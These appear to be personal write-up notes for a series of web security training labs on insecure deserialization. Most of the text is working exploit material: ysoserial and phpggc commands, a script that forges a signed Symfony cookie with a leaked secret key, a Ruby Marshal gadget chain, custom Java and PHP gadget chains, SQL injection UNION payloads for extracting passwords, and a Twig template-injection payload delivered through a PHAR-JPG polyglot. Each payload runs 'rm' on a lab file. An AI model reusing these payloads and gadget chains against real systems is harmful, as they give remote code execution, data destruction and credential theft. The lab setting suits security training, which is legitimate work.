# Lab: Modifying serialized objects

This lab uses a serialization-based session mechanism and is vulnerable to privilege escalation as a result. To solve the lab, edit the serialized object in the session cookie to exploit this vulnerability and gain administrative privileges. Then, delete the user`carlos`.

You can log in to your own account using the following credentials:`wiener:peter`

### **Exploit**

#### **ysoserial**

The main tool to exploit Java deserializations is[ysoserial](https://github.com/frohoff/ysoserial)([download here](https://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT/ysoserial-master-SNAPSHOT.jar)). You can also consider using[ysoseral-modified](https://github.com/pimps/ysoserial-modified)which will allow you to use complex commands (with pipes for example). Note that this tool is**focused**on exploiting`**ObjectInputStream**`. I would**start using the "URLDNS"**payload**before a RCE**payload to test if the injection is possible. Anyway, note that maybe the "URLDNS" payload is not working but other RCE payload is.

# Lab: Exploiting Java deserialization with Apache Commons

```bash
java -jar ysoserial-all.jar CommonsCollections4 'rm -rf /home/carlos/morale.txt' | base64 -w 0
```

# Lab: Exploiting PHP deserialization with a pre-built gadget chain

```php
// Remove some character in the cookie and we got an Error message
// Internal Server Error: Symfony Version: 4.3.6

// Use phpggc tool to generate the payload
// phpggc Symfony/RCE4 exec 'rm -rf /home/carlos/morale.txt' | base64 -w 0

// Check the sitemap and we got the /cgi-bin/phpinfo.php
// In the Environment section we get the SECRET_KEY=abojlsvl0uipkj8jthuduhvp7cvsz5yt

// Finally we sign the cookie 'SHA1' with the payload token and secret key

<?php
$token = "Tzo0NzoiU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxUYWdBd2FyZUFkYXB0ZXIiOjI6e3M6NTc6IgBTeW1mb255XENvbXBvbmVudFxDYWNoZVxBZGFwdGVyXFRhZ0F3YXJlQWRhcHRlcgBkZWZlcnJlZCI7YToxOntpOjA7TzozMzoiU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQ2FjaGVJdGVtIjoyOntzOjExOiIAKgBwb29sSGFzaCI7aToxO3M6MTI6IgAqAGlubmVySXRlbSI7czozMDoicm0gLXJmIC9ob21lL2Nhcmxvcy9tb3JhbGUudHh0Ijt9fXM6NTM6IgBTeW1mb255XENvbXBvbmVudFxDYWNoZVxBZGFwdGVyXFRhZ0F3YXJlQWRhcHRlcgBwb29sIjtPOjQ0OiJTeW1mb255XENvbXBvbmVudFxDYWNoZVxBZGFwdGVyXFByb3h5QWRhcHRlciI6Mjp7czo1NDoiAFN5bWZvbnlcQ29tcG9uZW50XENhY2hlXEFkYXB0ZXJcUHJveHlBZGFwdGVyAHBvb2xIYXNoIjtpOjE7czo1ODoiAFN5bWZvbnlcQ29tcG9uZW50XENhY2hlXEFkYXB0ZXJcUHJveHlBZGFwdGVyAHNldElubmVySXRlbSI7czo0OiJleGVjIjt9fQo=";

$secret_key = "abojlsvl0uipkj8jthuduhvp7cvsz5yt";
$sig_hmac_sha1 = hash_hmac("sha1", $token, $secret_key);
// echo $sig_hmac_sha1;
$payload = '{"token":"'.$token.'","sig_hmac_sha1":"'.$sig_hmac_sha1.'"}';
echo urlencode($payload);
?>
```

# Lab: Exploiting Ruby deserialization using a documented gadget chain

```ruby
# Autoload the required classes
Gem::SpecFetcher
Gem::Installer

# prevent the payload from running when we Marshal.dump it
module Gem
  class Requirement
    def marshal_dump
      [@requirements]
    end
  end
end

wa1 = Net::WriteAdapter.new(Kernel, :system)

rs = Gem::RequestSet.allocate
rs.instance_variable_set('@sets', wa1)
rs.instance_variable_set('@git_set', "rm /home/carlos/morale.txt")

wa2 = Net::WriteAdapter.new(rs, :resolve)

i = Gem::Package::TarReader::Entry.allocate
i.instance_variable_set('@read', 0)
i.instance_variable_set('@header', "aaa")


n = Net::BufferedIO.allocate
n.instance_variable_set('@io', i)
n.instance_variable_set('@debug_output', wa2)

t = Gem::Package::TarReader.allocate
t.instance_variable_set('@io', n)

r = Gem::Requirement.allocate
r.instance_variable_set('@requirements', t)

payload = Marshal.dump([Gem::SpecFetcher, Gem::Installer, r])
# puts payload.inspect

require "base64"
puts "Payload (Base64 encoded):"
puts Base64.encode64(payload)
```

# Lab: Developing a custom gadget chain for Java deserialization

Check the sitemap and we got `/backup/AccessTokenUser.java`

Check the `/backup` path and we got `/backup/ProductTemplate.java`

Create a small program

```java
// Main.java
import data.productcatalog.ProductTemplate;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.io.Serializable;
import java.util.Base64;
import java.io.IOException;

class Main {
    public static void main(String[] args) {
        ProductTemplate productTemplate = new ProductTemplate("SQL-INJECT");
        
        // Serialize the object and encode it to Base64
        try {
            // Convert the object to a byte array (serialization)
            ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
            ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);
            objectOutputStream.writeObject(productTemplate);
            objectOutputStream.flush();
            
            // Get the byte array from the output stream
            byte[] serializedBytes = byteArrayOutputStream.toByteArray();
            
            // Convert the byte array to a Base64 string
            String base64String = Base64.getEncoder().encodeToString(serializedBytes);
            
            // Print the Base64-encoded serialized object
            System.out.println("Base64 Serialized ProductTemplate: " + base64String);
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}
```

```java
// data/productcatalog/ProductTemplate.java
package data.productcatalog;

import java.io.Serializable;

public class ProductTemplate implements Serializable
{
    static final long serialVersionUID = 1L;

    private final String id;
    private transient Product product;

    public ProductTemplate(String id)
    {
        this.id = id;
    }

    public String getId()
    {
        return id;
    }

    public Product getProduct()
    {
        return product;
    }
}
```

```java
// data.productcatalog.Product.java

package data.productcatalog;

class Product {
    private String id;
    
    public Product(String id) {
        this.id = id;
    }}
```

Replace the `SQL-INJECT` by `'` and we got a SQL error like:

```
Internal Server Errorjava.io.IOException: org.postgresql.util.PSQLException: Unterminated string literal started at position 36 in SQL SELECT * FROM products WHERE id = ''' LIMIT 1. Expected char
```

```sql
/* Enum the number of table's column */
' ORDER BY 8--

' UNION SELECT NULL, NULL, NULL, CAST(password AS numeric), NULL, NULL, NULL, NULL FROM users--
```

# Lab: Developing a custom gadget chain for PHP deserialization

Check the sitemap we got `/cgi-bin/libs/CustomTemplate.php` Change to `/cgi-bin/libs/CustomTemplate.php~` then we got the source code.

```php
<?php

class CustomTemplate {
    private $default_desc_type;
    private $desc;
    public $product;

    public function __construct($desc_type='HTML_DESC') {
        $this->desc = new Description();
        $this->default_desc_type = $desc_type;
        // Carlos thought this is cool, having a function called in two places... What a genius
        $this->build_product();
    }

    public function __sleep() {
        return ["default_desc_type", "desc"];
    }

    public function __wakeup() {
        $this->build_product();
    }

    private function build_product() {
        $this->product = new Product($this->default_desc_type, $this->desc);
    }
}

class Product {
    public $desc;

    public function __construct($default_desc_type, $desc) {
        $this->desc = $desc->$default_desc_type;
    }
}

class Description {
    public $HTML_DESC;
    public $TEXT_DESC;

    public function __construct() {
        // @Carlos, what were you thinking with these descriptions? Please refactor!
        $this->HTML_DESC = '<p>This product is <blink>SUPER</blink> cool in html</p>';
        $this->TEXT_DESC = 'This product is cool in text';
    }
}

class DefaultMap {
    private $callback;

    public function __construct($callback) {
        $this->callback = $callback;
    }

    public function __get($name) {
        return call_user_func($this->callback, $name);
    }
}
?>
```

```
call_user_func($this->callback, $name);

-> call_user_func("exec", "rm /home/carlos/morale.txt");


$this->desc = $desc->$default_desc_type;

$desc = DefaultMap;

CustomTemplate->default_desc_type = "rm /home/carlos/morale.txt";
```

```php
<?php

// Solution

class CustomTemplate {
    private $default_desc_type;
    private $desc;
    public $product;

    public function __construct($desc_type='HTML_DESC') {
        $this->desc = new DefaultMap("exec");
        $this->default_desc_type = "rm /home/carlos/morale.txt";
        // Carlos thought this is cool, having a function called in two places... What a genius
        $this->build_product();
    }

    public function __sleep() {
        return ["default_desc_type", "desc"];
    }

    public function __wakeup() {
        $this->build_product();
    }

    private function build_product() {
        $this->product = new Product($this->default_desc_type, $this->desc);
    }
}

class Product {
    public $desc;

    public function __construct($default_desc_type, $desc) {
        $this->desc = $desc->$default_desc_type;
    }
}

class Description {
    public $HTML_DESC;
    public $TEXT_DESC;

    public function __construct() {
        // @Carlos, what were you thinking with these descriptions? Please refactor!
        $this->HTML_DESC = '<p>This product is <blink>SUPER</blink> cool in html</p>';
        $this->TEXT_DESC = 'This product is cool in text';
    }
}

class DefaultMap {
    private $callback;

    public function __construct($callback) {
        $this->callback = $callback;
    }

    public function __get($name) {
        return call_user_func($this->callback, $name);
    }
}

$cus = new CustomTemplate();
$ser=serialize($cus);
echo $ser;
?>
```

Modify to fit

# Lab: Using PHAR deserialization to deploy a custom gadget chain

1. Observe that the website has a feature for uploading your own avatar, which only accepts`JPG`images. Upload a valid`JPG`as your avatar. Notice that it is loaded using`GET /cgi-bin/avatar.php?avatar=wiener`.
2. In Burp Repeater, request`GET /cgi-bin`to find an index that shows a`Blog.php`and`CustomTemplate.php`file. Obtain the source code by requesting the files using the`.php~`backup extension.
3. Study the source code and identify the gadget chain involving the`Blog->desc`and`CustomTemplate->lockFilePath`attributes.
4. Notice that the`file_exists()`filesystem method is called on the`lockFilePath`attribute.
5. Notice that the website uses the Twig template engine. You can use deserialization to pass in an server-side template injection (SSTI) payload. Find a documented SSTI payload for remote code execution on Twig, and adapt it to delete Carlos's file:`{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("rm /home/carlos/morale.txt")}}`
6. Write a some PHP for creating a`CustomTemplate`and`Blog`containing your SSTI payload:`class CustomTemplate {} class Blog {} $object = new CustomTemplate; $blog = new Blog; $blog->desc = '{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("rm /home/carlos/morale.txt")}}'; $blog->user = 'user'; $object->template_file_path = $blog;`
7. Create a`PHAR-JPG`polyglot containing your PHP script. You can find several scripts for doing this online (search for "`phar jpg polyglot`"). Alternatively, you can download our [ready-made one](https://github.com/PortSwigger/serialization-examples/blob/master/php/phar-jpg-polyglot.jpg).
8. Upload this file as your avatar.
9. In Burp Repeater, modify the request line to deserialize your malicious avatar using a`phar://`stream as follows:`GET /cgi-bin/avatar.php?avatar=phar://wiener`
10. Send the request to solve the lab.

